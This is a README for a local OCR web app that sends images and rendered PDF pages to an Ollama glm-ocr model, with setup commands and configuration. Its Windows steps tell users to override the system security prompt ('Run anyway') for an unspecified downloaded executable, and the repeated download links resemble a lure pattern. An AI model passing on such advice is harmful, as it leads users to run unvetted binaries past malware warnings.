# 🧠 local-ocr-workbench - Test OCR on files fast

[![Download or visit the release page](https://img.shields.io/badge/Download-Visit%20the%20release%20page-7c3aed?style=for-the-badge)](https://github.com/corrosive-angleofview619/local-ocr-workbench)

## 📥 Download

Visit this page to download and run the app on Windows:

https://github.com/corrosive-angleofview619/local-ocr-workbench

## 🪟 Run on Windows

1. Open the download page in your web browser.

2. Download the Windows version of the app from the page.

3. If the file is in a ZIP folder, right-click it and choose **Extract All**.

4. Open the extracted folder.

5. Double-click the app file to start it.

6. If Windows shows a security prompt, choose **More info** and then **Run anyway**.

7. Keep the app open in your browser or desktop window.

8. Open Ollama if the app asks for it.

## ✨ What this app does

- Upload an image or PDF
- Turn PDF pages into images before OCR
- Send the image to an OCR model
- Stream the text back into the page
- Show the result as markdown

## 🧰 What you need

- A Windows computer
- Internet access for the first download
- Ollama installed on your computer
- The `glm-ocr` model
- A modern web browser like Chrome, Edge, or Firefox

## 🚀 First-time setup

1. Install Ollama from the official Ollama site.

2. Open Ollama after install.

3. Pull the OCR model with this command:

```bash
ollama pull glm-ocr
```

4. Wait for the model to finish downloading.

5. Keep Ollama open while you use the app.

## 🔧 Local setup

Use these steps if you want to run the app from source:

1. Install Node.js on your computer.

2. Download this repository.

3. Open a terminal in the project folder.

4. Install the app files:

```bash
npm install
```

5. Copy the example env file:

```bash
cp .env.example .env
```

6. Start the app:

```bash
npm run dev
```

7. Open the local address shown in the terminal.

8. Upload an image or PDF.

## 🖼️ How to use it

1. Open the app.

2. Choose an image or PDF from your computer.

3. If you upload a PDF, the app shows one page at a time.

4. Move through the pages as needed.

5. Wait while the OCR model reads the file.

6. Read the text on the page as it appears.

7. Copy the result if you want to save it elsewhere.

## 📄 PDF behavior

When you upload a PDF, the app does not read the file as plain text.

It first renders the current page as an image.

Then it sends that image to the OCR model.

This helps with scanned PDFs, photos of pages, and files that do not contain selectable text.

## ⚙️ Configuration

You can set the default OCR connection in `.env`.

```env
VITE_OCR_BASE_URL=/api/proxy
VITE_OCR_ENDPOINT=/api/generate
VITE_OCR_MODEL=glm-ocr
OCR_PROXY_TARGET=http://127.0.0.1:11434
```

## 📝 What these settings mean

- `VITE_OCR_BASE_URL`: The base path the app uses for OCR requests
- `VITE_OCR_ENDPOINT`: The API path used to send OCR jobs
- `VITE_OCR_MODEL`: The model name the app sends to Ollama
- `OCR_PROXY_TARGET`: The local Ollama address on your computer

## 🧪 Useful checks

If the app does not work as expected, check these items:

1. Ollama is open and running.

2. The `glm-ocr` model is installed.

3. The app can reach `http://127.0.0.1:11434`.

4. Your browser allows local app access.

5. You uploaded a supported file type such as PNG, JPG, JPEG, or PDF.

## 📁 Supported files

- PNG
- JPG
- JPEG
- PDF

## 🖥️ System needs

- Windows 10 or later
- 8 GB RAM or more
- A few GB of free disk space
- A GPU helps, but the app can run on CPU
- A stable local Ollama install

## 🔄 Common flow

1. Download the app from the link above.

2. Install Ollama.

3. Pull `glm-ocr`.

4. Start Ollama.

5. Open the app.

6. Upload a file.

7. Read the OCR output in the page

## 📌 Project purpose

This app helps you test OCR on local files without sending them to a cloud service.

It is useful for scanned documents, screenshots, and PDFs that need text extraction

## 🔗 Download again

Visit this page to download and run the app on Windows:

https://github.com/corrosive-angleofview619/local-ocr-workbench